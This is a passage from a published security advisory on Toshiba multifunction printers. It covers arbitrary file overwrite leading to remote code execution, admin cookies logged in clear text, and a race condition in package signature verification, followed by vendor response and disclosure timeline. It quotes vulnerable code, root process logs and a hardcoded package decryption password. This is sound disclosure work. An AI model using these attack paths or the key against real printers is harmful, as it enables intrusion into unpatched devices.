<span style="color: #666666">480</span>             absolute_package_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(packagename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">481</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_package_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">482</span>                 shutil<span style="color: #666666">.</span>copyfileobj(package_file, output_file)
<span style="color: #666666">483</span>
<span style="color: #666666">484</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">485</span>
<span style="color: #666666">486</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">487</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">488</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
</pre></div>

<p>An attacker can copy and overwrite files as apache (e.g. Python files) to get Remote Code Execution.</p>
<p>An attacker can get Remote Code Execution by creating and/or overwriting files (mainly crontab files due to the restriction on the filename).</p>
<p><a id="session-disclosure-logs"></a></p>
<h2>Details - Session disclosure inside the log files in the installation of applications</h2>
<p>During the installation of applications, cookies are written in clear-text in logs.</p>
<p>When installing an application, several requests will be sent and the method <code>validate_user()</code> will be called: this method will write admin cookies in clear-text in the logs.</p>
<p>In the <code>upload_package</code> method, the <code>validate_user()</code> is called to check the authorization on line 191 in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code>:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">170</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;upload_package&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">False</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;string&#39;</span>)
<span style="color: #666666">171</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(request):
<span style="color: #666666">172</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">173</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : Start &quot;</span>)
<span style="color: #666666">174</span>     SessionID <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">175</span>     session <span style="color: #666666">=</span> <span style="color: #BA2121">&#39; &#39;</span>
<span style="color: #666666">176</span>     csrfpId <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">177</span>
<span style="color: #666666">178</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;SessionID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">179</span>         SessionID <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;SessionID&#39;</span>] <span style="color: #666666">&lt;----</span> SessionID <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">cookie</span>
<span style="color: #666666">180</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;Session&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">181</span>         session <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;Session&#39;</span>] <span style="color: #666666">&lt;--------</span> Session <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">cookie</span>
<span style="color: #666666">182</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;txtCSRFPID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>POST:
<span style="color: #666666">183</span>         csrfpId <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;txtCSRFPID&#39;</span>]
<span style="color: #666666">184</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">191</span>     validationMap <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>validate_user(SessionID, session, csrfpId)
</pre></div>

<p>During the execution flow, on line 191, the method <code>validate_user()</code> is called with the <code>SessionID</code> and the <code>Session</code> cookies.</p>
<p>These cookies are then written in clear-text in the logs on lines 391 and 392 in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">388</span>     <span style="color: #AA22FF">@classmethod</span>
 <span style="color: #666666">389</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">validate_user</span>(<span style="color: #008000">cls</span>, sessionId, session, csrfpid):
 <span style="color: #666666">390</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: validate_user start&quot;</span>)
 <span style="color: #666666">391</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;Session ID recieved   : &quot;</span> <span style="color: #666666">+</span> sessionId)
 <span style="color: #666666">392</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;CSRFPID  Recieved    : &quot;</span> <span style="color: #666666">+</span> csrfpid)
 <span style="color: #666666">393</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;Session     : &quot;</span> <span style="color: #666666">+</span> session)
 <span style="color: #666666">394</span>
</pre></div>

<p>Admin cookies are written in clear-text in logs.</p>
<p>An attacker can retrieve them and bypass the authentication mechanism.</p>
<p><a id="toctou-rce"></a></p>
<h2>Details - TOCTOU vulnerability in the installation of applications, allowing to install rogue applications and get RCE</h2>
<p>When installing an application through the web application (Administration &gt; Application &gt; Application List &gt; Install Application), a signature is checked inside the printer to proceed the installation of the uploaded application.</p>
<p>There is a chain of trust and the installation process is entirely based on the validity of the chain of trust.</p>
<p>Through dynamic analysis using a root shell during the installation process, we can see several commands being executed:</p>
<pre>
2023/10/27 10:54:31 CMD: UID=0     PID=32195  | sh -c if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi  
2023/10/27 10:54:31 CMD: UID=0     PID=32194  | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi  
<font color=red>2023/10/27 10:54:33 CMD: UID=0     PID=32196  | sh -c echo "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2MWVi+kjfL/9lyuBls9O
NU5+qgiWNSzGgGqUq+Z9uaiWGoz6wOBKlQc55f3nUs6CfpX/e8cHgS8nySWWvgy8
LnK4f6XAUMRQC03jmHXfhbvJOd6PbkljFM/k19AwOf/xkTUVm45Tp5P3T1Bd9XWS
qUJxobgTS15c++IcsAAScD8cLZPRywLWRBoA0poms6uPVkyN9Oc3J2EMpZT/6XQW
ucNFh/ejLe1z0Pt/Sk4TeN/ELZ3+IHwBRfApelixcEoZTWtVbnvaUqO0mZ8PebTT
m6PlKE9fGiAe1FAQZE3fE7StyOIwxd+n3t5M+SdGba4ZJWJMskBaR8bTYHHe4DRp
PQIDAQAB
-----END PUBLIC KEY-----"> /work/ci/tmp/MFPAPI_public.key
2023/10/27 10:54:33 CMD: UID=0     PID=32197  | sh -c openssl rsautl -verify -pubin -inkey /work/ci/tmp/MFPAPI_public.key -in /work/al/tmp/package/Signature.enc -out /work/ci/SignatureFile_Dec</font>
2023/10/27 10:54:33 CMD: UID=0     PID=32198  | sh -c openssl enc -d -aes256 -md md5 -in /work/al/tmp/package/ApplicationPackage.enc -out /work/al/tmp/package/ApplicationPackage.zip -k 4f2594ffaa79c3a58e5a4868910f27f1 
</pre>

<p>If an invalid <code>Signature.enc</code> file is provided inside the uploaded application Package.zip file, then the process stops.</p>
<p>The command (PID=32196 in the dynamic analysis) that writes the public key into a file is hardcoded inside <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code>.</p>
<p>Content of <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code>:</p>
<pre><code>.rodata:00016620 aEchoBeginPubli db 'echo "-----BEGIN PUBLIC KEY-----',0Ah
.rodata:00016620                 db 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2MWVi+kjfL/9lyuBls9O',0Ah
.rodata:00016620                 db 'NU5+qgiWNSzGgGqUq+Z9uaiWGoz6wOBKlQc55f3nUs6CfpX/e8cHgS8nySWWvgy8',0Ah
.rodata:00016620                 db 'LnK4f6XAUMRQC03jmHXfhbvJOd6PbkljFM/k19AwOf/xkTUVm45Tp5P3T1Bd9XWS',0Ah
.rodata:00016620                 db 'qUJxobgTS15c++IcsAAScD8cLZPRywLWRBoA0poms6uPVkyN9Oc3J2EMpZT/6XQW',0Ah
.rodata:00016620                 db 'ucNFh/ejLe1z0Pt/Sk4TeN/ELZ3+IHwBRfApelixcEoZTWtVbnvaUqO0mZ8PebTT',0Ah
.rodata:00016620                 db 'm6PlKE9fGiAe1FAQZE3fE7StyOIwxd+n3t5M+SdGba4ZJWJMskBaR8bTYHHe4DRp',0Ah
.rodata:00016620                 db 'PQIDAQAB',0Ah
.rodata:00016620                 db '-----END PUBLIC KEY-----"&gt; /work/ci/tmp/MFPAPI_public.key',0
.rodata:0001680A                 align 20h
</code></pre>
<p>The verification using the public key is secure in theory. The size of the RSA key is 2048 bits, so it is unlikely to be factorized by threat actors:</p>
<pre><code>kali% openssl rsa -inform PEM -pubin -in MFPAPI_public.key -text -noout
Public-Key: (2048 bit)
Modulus:
    00:d8:c5:95:8b:e9:23:7c:bf:fd:97:2b:81:96:cf:
    4e:35:4e:7e:aa:08:96:35:2c:c6:80:6a:94:ab:e6:
    7d:b9:a8:96:1a:8c:fa:c0:e0:4a:95:07:39:e5:fd:
    e7:52:ce:82:7e:95:ff:7b:c7:07:81:2f:27:c9:25:
    96:be:0c:bc:2e:72:b8:7f:a5:c0:50:c4:50:0b:4d:
    e3:98:75:df:85:bb:c9:39:de:8f:6e:49:63:14:cf:
    e4:d7:d0:30:39:ff:f1:91:35:15:9b:8e:53:a7:93:
    f7:4f:50:5d:f5:75:92:a9:42:71:a1:b8:13:4b:5e:
    5c:fb:e2:1c:b0:00:12:70:3f:1c:2d:93:d1:cb:02:
    d6:44:1a:00:d2:9a:26:b3:ab:8f:56:4c:8d:f4:e7:
    37:27:61:0c:a5:94:ff:e9:74:16:b9:c3:45:87:f7:
    a3:2d:ed:73:d0:fb:7f:4a:4e:13:78:df:c4:2d:9d:
    fe:20:7c:01:45:f0:29:7a:58:b1:70:4a:19:4d:6b:
    55:6e:7b:da:52:a3:b4:99:9f:0f:79:b4:d3:9b:a3:
    e5:28:4f:5f:1a:20:1e:d4:50:10:64:4d:df:13:b4:
    ad:c8:e2:30:c5:df:a7:de:de:4c:f9:27:46:6d:ae:
    19:25:62:4c:b2:40:5a:47:c6:d3:60:71:de:e0:34:
    69:3d
Exponent: 65537 (0x10001)
</code></pre>
<p>The entire chain of trust is based on a public key hardcoded inside the <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code> file, whose corresponding private key is used to generate the packages.</p>
<p>Unfortunately, when doing dynamic analysis, we can see that the public key used to verify the <code>Signature.enc</code> file is stored in an insecure manner in <code>/work/ci/tmp/MFPAPI_public.key</code>.</p>
<p>The <code>/work/ci/tmp/</code> directory is 777, allowing any attacker to write any file:</p>
<pre><code>bash-4.1# ls -la /work/ci/tmp/
total 16
drwxrwxrwx 2 root root    12288 Oct 27 11:26 .
drwxrwxrwx 6 root root     4096 Oct 27 11:26 ..
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_00000#boxproperties_dom.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#GetCmdDoc.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionModeDeviceFaxEvent.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionModeDeviceState.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionModeSystemInformation.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 03:17 HDB_HDBROOT#RestrictionPowerSaveCommandToDSM.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionSecretReceptionFalseToDSM.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 06:17 HDB_HDBROOT#RestrictionSleepCommandToDSM.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_Precompiled#Resources?Frames?COMMON?ALERTS?alertspanel_devicestatus.xml.txt
[...]
</code></pre>
<p>Furthermore, the resulting file <code>/work/ci/tmp/MFPAPI_public.key</code> is using insecure permissions (666) allowing any attacker to replace it with a rogue public key during the verification process using a file overwrite vulnerability.</p>
<p>This is a TOCTOU vulnerability:</p>
<pre><code>bash-4.1# for i in $(seq 1 100); do ls -la /work/ci/tmp/MFPAPI_public.key;sleep 0.1;done
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
-rw-rw-rw- 1 root trusted 451 Oct 27 11:26 /work/ci/tmp/MFPAPI_public.key
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
[...]
</code></pre>
<p>An attacker can replace the <code>/work/ci/tmp/MFPAPI_public.key</code> file between the time when is it written into the printer and when it is being used by openssl:</p>
<pre><code>2023/10/27 10:54:33 CMD: UID=0     PID=32196  | sh -c echo "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2MWVi+kjfL/9lyuBls9O
NU5+qgiWNSzGgGqUq+Z9uaiWGoz6wOBKlQc55f3nUs6CfpX/e8cHgS8nySWWvgy8
LnK4f6XAUMRQC03jmHXfhbvJOd6PbkljFM/k19AwOf/xkTUVm45Tp5P3T1Bd9XWS
qUJxobgTS15c++IcsAAScD8cLZPRywLWRBoA0poms6uPVkyN9Oc3J2EMpZT/6XQW
ucNFh/ejLe1z0Pt/Sk4TeN/ELZ3+IHwBRfApelixcEoZTWtVbnvaUqO0mZ8PebTT
m6PlKE9fGiAe1FAQZE3fE7StyOIwxd+n3t5M+SdGba4ZJWJMskBaR8bTYHHe4DRp
PQIDAQAB
-----END PUBLIC KEY-----"&gt; /work/ci/tmp/MFPAPI_public.key
/\
|
------------- TOCTOU HERE --------------------
|
V
2023/10/27 10:54:33 CMD: UID=0     PID=32197  | sh -c openssl rsautl -verify -pubin -inkey /work/ci/tmp/MFPAPI_public.key -in /work/al/tmp/package/Signature.enc -out /work/ci/SignatureFile_Dec
</code></pre>
<p>There is a second TOCTOU between the following openssl commands. The second command is only executed if the <code>Signature.enc</code> is correctly verified in the first command and the password in the second command seems to depend on the content of the <code>Signature.enc</code> file. </p>
<p>Between the 2 openssl commands, an attacker can replace <code>/work/al/tmp/package/ApplicationPackage.enc</code> with a malicious package (encrypted with the password used by a trusted package).</p>
<pre><code>24     2023/10/27 10:54:33 CMD: UID=0     PID=32197  | sh -c openssl rsautl -verify -pubin -inkey /work/ci/tmp/MFPAPI_public.key -in /work/al/tmp/package/Signature.enc -out /work/ci/SignatureFile_Dec
/\
|
------------- TOCTOU HERE --------------------
|
V
25     2023/10/27 10:54:33 CMD: UID=0     PID=32198  | sh -c openssl enc -d -aes256 -md md5 -in /work/al/tmp/package/ApplicationPackage.enc -out /work/al/tmp/package/ApplicationPackage.zip -k 4f2594ffaa79c3a58e5a4868910f27f1
</code></pre>
<p>It is possible to install a rogue application package, signed with a rogue private key and at the same time to upload a file replacing the Toshiba original public key at <code>/work/ci/tmp/MFPAPI_public.key</code> with the corresponding rogue public key, breaking the entire chain of trust.</p>
<p>This rogue public key will then be used to verify the application (and it will pass): the application will be installed.</p>
<p>Consequently, an attacker can forge a rogue <code>/work/ci/tmp/MFPAPI_public.key</code> key and use its own public/private keys to install package file.</p>
<p>An attacker can also replace <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code> with a modified library since the permissions are insecure allowing to (i) get Remote Code Execution when the code is executed and/or (ii) contain a malicious public key and also get RCE.</p>
<p>An attacker with admin access can install rogue applications and get Remote Code Execution.</p>
<h2>Vendor Response</h2>
<p>JPCERT provided a <a href="https://jvn.jp/en/vu/JVNVU97136265/index.html">security bulletin</a>.</p>
<p>Toshiba provided a <a href="https://www.toshibatec.com/information/20240531_01.html">security bulletin</a>.</p>
<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<ul>
<li>Mar - May 2023: Security assessment performed on Toshiba Multi-function printers (a total of 15 working days have been allocated for this security assessment).</li>
<li>Jun 14, 2023: A complete report was sent to Toshiba.</li>
<li>Jun 15, 2023: Tosbiba acknowledged the reception of the security assessment.</li>
<li>Jun 28, 2023: Tosbiba confirmed that the evaluation is in progress and provided new security contacts.</li>
<li>Jun 29, 2023: I asked the GPG keys of the new security contacts.</li>
<li>Jul 4, 2023: Toshiba provided new GPG keys and confirmed they were able to reproduce allmost all of the issues.</li>
<li>Jul 4, 2023: I asked when the security patches would be provided.</li>
<li>Jul 7, 2023: Toshiba confirmed that the vulnerabilities affect some models and the evaluation is still in progress. Toshiba asked details about the security assessment.</li>
<li>Jul 10, 2023: Additional details about the security assessment were provided.</li>
<li>Jul 11, 2023: Toshiba provided an Excel file listing the vulnerabilities with their evaluation.</li>
<li>Jul 12, 2023: Comments were provided to Toshiba regarding the evaluation of the vulnerabilities.</li>
<li>Jul 13, 2023: Toshiba provided further details regarding the evaluation of the vulnerabilities.</li>
<li>Jul 14, 2023: Comments were provided to Toshiba regarding the threat model and the necessity to patch root causes of vulnerabilities.</li>
<li>Jul 17, 2023: An updated Excel file with my additional comments was provided to Toshiba.</li>
<li>Jul 18, 2023: Toshiba confirmed the reception of the Excel file and confirmed they would review the issues by prioritizing critical vulnerabilities and would organize a meeting.</li>
<li>Jul 19, 2023: I confirmed that the meeting could be organized after the Excel file was reviewed.</li>
<li>Jul 21, 2023: Toshiba provided a work-in-progress Excel file with updated evaluations.</li>
<li>Jul 25, 2023: I confirmed the reception of the Excel file.</li>
<li>Jul 27, 2023: Toshiba confirmed that the new security evaluation was still in progress and asked feedback regarding the work-in-progress document listing measures.</li>
<li>Jul 28, 2023: I confirmed that I would provide comments about the work-in-progress document.</li>
<li>Aug 1, 2023: The Excel file was reviewed and an updated version was sent to Toshiba, confirming that the current Toshiba's analysis was very efficient (root causes of vulnerabilities would be patched).</li>
<li>Aug 1, 2023: Toshiba confirmed the reception of the document.</li>
<li>Aug 4, 2023: Toshiba sent the final version of the Excel document listing the vulnerabilities and the security patches.</li>
<li>Aug 4, 2023: I confirmed the reception of the document.</li>
<li>Aug 7, 2023: The Excel file listing the vulnerabilities, evaluations and remediations was updated with my comments and shared with Toshiba.</li>
<li>Aug 9, 2023: Virtual meeting with Toshiba - discussions about the vulnerabilities and the timeline to get security patches.</li>
<li>Aug 10, 2023: Additional details were provided to Toshiba regarding new potential vulnerabilities in an interesting attack surface that had not been analyzed.</li>
<li>Sep 5, 2023: Toshiba provided access to a firmware image of a third-party application.</li>
<li>Oct 24, 2023: Toshiba provided a list of CVE identifiers regarding the previously reported vulnerabilities.</li>
<li>Oct 25, 2023: Emails regarding the CVE identifiers.</li>
<li>Oct 26, 2023: Emails regarding the CVE identifiers.</li>
<li>Oct 27, 2023: 5 new 0-day vulnerabilities shared with Toshiba, after the analysis of the firmware image of a third-party application.</li>
<li>Oct 30, 2023: Toshiba confirmed that the analysis of the new vulnerabilities would be done as soon as possible.</li>
<li>Nov 11, 2023: Toshiba confirmed that the analysis of the new vulnerabilities was in-progress.</li>
<li>Nov 20, 2023: Emails regarding the CVSSv3 scores of the vulnerabilities.</li>
<li>Nov 21, 2023: Toshiba confirmed that they would review the scores.</li>
<li>Nov 21, 2023: Emails regarding CVE IDs.</li>
<li>Nov 22, 2023: Toshiba confirmed that only a small subset of products were previously patched and that CVEs would be public after all the supported models have been patched.</li>
<li>Nov 28, 2023: Toshiba provided an updated Excel file, with new vulnerabilities.</li>
<li>4 Dec, 2023: Additional details were provided to Toshiba regarding new vulnerabilities.</li>
<li>Dec, 2023: Discussions regarding CVSSv3 scores.</li>
<li>Feb 2, 2024: Toshiba confirmed the CVSSv3 scores of the vulnerabilities.</li>
<li>Feb 5, 2024: Toshiba confirmed that the security bulletins would be published around May-June 2024.</li>
<li>May 8, 2024: I asked Toshiba when the advisories would be public.</li>
<li>May 10, 2024: Toshiba confirmed that the advisories would be public by the end of May.</li>
<li>May 14, 2024: Toshiba provided a list of CVEs corresponding to the vulnerabilities I reported and asked to respect the embargo.</li>
<li>May 14, 2024: I confirmed the reception of the CVEs.</li>
<li>May 20, 2024: Toshiba informed that the security advisories would be delayed to mid-June 2024.</li>
<li>May 20, 2024: I confirmed that it was fine for me.</li>
<li>Jun 4, 2024: Toshiba provided a list of affected printers and patched firmware versions.</li>
<li>Jun 14, 2024: Toshiba published a security advisory: <a href="https://www.toshibatec.com/information/20240531_01.html">https://www.toshibatec.com/information/20240531_01.html</a>.</li>
<li>Jun 14, 2024: JPCERT published a security advisory: <a href="https://jvn.jp/en/vu/JVNVU97136265/index.html">https://jvn.jp/en/vu/JVNVU97136265/index.html</a>.</li>
<li>June 27, 2024: A security advisory is published.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html">https://pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2024-toshiba-mfp.txt">https://pierrekim.github.io/advisories/2024-toshiba-mfp.txt</a></p>
<p><a href="https://www.toshibatec.com/information/20240531_01.html">https://www.toshibatec.com/information/20240531_01.html</a></p>
<p><a href="https://www.toshibatec.com/information/pdf/information20240531_01.pdf">https://www.toshibatec.com/information/pdf/information20240531_01.pdf</a></p>
<p><a href="https://jvn.jp/en/vu/JVNVU97136265/index.html">https://jvn.jp/en/vu/JVNVU97136265/index.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
    <div>
        <p class="text-muted">published on 2024-06-27 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
    </div>
</div>

</div>
</body>
</html>